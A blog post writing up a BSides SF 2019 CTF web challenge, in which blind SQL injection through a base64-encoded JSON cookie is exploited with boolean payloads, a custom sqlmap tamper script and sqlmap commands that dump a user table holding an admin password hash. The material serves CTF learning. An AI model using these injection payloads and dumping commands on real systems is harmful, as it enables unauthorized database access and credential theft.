---
layout: post
current: post
cover: assets/images/sqlmap.png
navigation: True
title: "Dumping tables using sqlmap;--"
date: 2019-03-27 14:19:51 +0530
tags: sqli sqlmap web security ctf
class: post-template
subclass: post
toc: True
disqus: True
author: rnehra01
---
This post will try to show a small portion of power that sqlmap possess.
### sequel
This is a web challenge from BSides SF CTF 2019. The home page shows a login form. After logging using `guest` account, I am presented with a list of movies with their ratings and a private note for each. The private note corresponding to Hackers movie has some reference to admin, so I guess I need to log in as admin. SQLi on the login form doesn't work. But there is a `1337_AUTH` cookie which on base64 decoding gives `{"username":"guest","password":"guest"}`. Cool, lets try SQLi here and making `username` to `guest" and "1"="1` results in successful login while `guest" and "1"="2` shows `Invalid user`, so it's a blind injection. Doing some recon using my [web-cheats](https://github.com/rnehra01/web-cheats/blob/master/sqli.md#for-sqlite), I am able to recognise that the backend database is SQLite as the sqlite specific payload `guest" and EXISTS(select sqlite_version) and "1"="1` works. So the task is to pull entries related to admin from the database. I have previously written a [script](https://github.com/InfoSecIITR/write-ups/blob/master/2016/SharifCTF-2016/web-200/web-200.py) to extract data but I have heard a lot about [sqlmap](http://sqlmap.org/) but haven't used it yet. So lets give it a go and also writing that script took me a long time.

### Time to use the big guns
Lets start by finding the tables present in the database which comes down to this
<pre>
./sqlmap.py -u "http://localhost:8081/sequels" --cookie="*" --technique=B --tamper tamper.py
--tables --code=200 --dbms=SQLite --risk=3 --level=3  --flush-session --hex
</pre>
In our case the payload is base64 encoded and then injected into cookie parameter so I used the `--tamper` switch with tamper.py which replaces `"` with `\"` in the payload from sqlmap and then return base64 encoded cookie which repalces `*` in the `cookies`.
{% highlight python %}
from base64 import urlsafe_b64encode as be

def tamper(payload, **kwargs):
    data = '{"username":"guest%s","password":"guest"}' % payload.replace('"','\\\"')
    return "1337_AUTH=%s" % be(data)
{% endhighlight %}
The above command returns
<pre>
[3 tables]
+----------+
| notes    |
| reviews  |
| userinfo |
+----------+
</pre>
So the admin info will be present in the `userinfo` table. Lets dump it
{% highlight terminal %}
rnehra@pc ~/1/sqlmap> ./sqlmap.py -u "http://localhost:8081/sequels" --cookie="*" --technique=B --tamper tamper.py --dump --code=200 --dbms=SQLite --risk=3 --level=3 --hex -T userinfo

[15:59:59] [INFO] retrieved: CREATE TABLE userinfo (    username text not null primary key,    password text not null)
Table: userinfo
[2 entries]
+-----------+-----------+
| tusername | tpassword |
+-----------+-----------+
|  blank    |  blank    |
|  blank    |  blank    |
+-----------+-----------+
{% endhighlight %}
__WTF__, the column names look strange.
### Bug in sqlmap 
Okay, the table syntax `CREATE TABLE userinfo (    username text not null primary key,    password text not null)` looks good, I guess there is `\t` character before column name and that's how sqlmap assume `tusername` as column name instead of `username`. Cool, I find a bug in sqlmap. Next thing, I report it on [Github](https://github.com/sqlmapproject/sqlmap/issues/3551) and they are super quick to push a fix.

### Continue hacking
So I override the column names for the table using `-C` switch and the complete table is here
{% highlight terminal %}
rnehra@pc ~/1/sqlmap> ./sqlmap.py -u "http://localhost:8081/sequels" --cookie="*" --technique=B --tamper tamper.py --dump --code=200 --dbms=SQLite --risk=3 --level=3 --hex -T userinfo -C username,password
...
Table: userinfo
[2 entries]
+-------------+----------------------------------+
| username    | password                         |
+-------------+----------------------------------+
| guest       | guest                            |
| sequeladmin | f5ec3af19f0d3679e7d5a148f4ac323d |
+-------------+----------------------------------+
{% endhighlight %}
Logging into the account of `sequeladmin` gives the flag.

### Conclusion
1. Sqlmap can help in avoiding writing scripts, thus exploiting much faster.
2. Instead of blindly running sqlmap against a target, try to do some recon and feed as much data you can to sqlmap. In my case, I provide
   * correct injection point `--cookie="*"`
   * type of DBMS `--dbms=SQLite`
   * how SQLi can be exploited `--technique=B` which is blind SQLi.
3. In Blind SQLi, try to provide method to differentiate between a  __True__ and __False__ query, in my case __Invalid user__ is accompanied with status code __404__ and successful login with __200__, hence the `--code=200`.
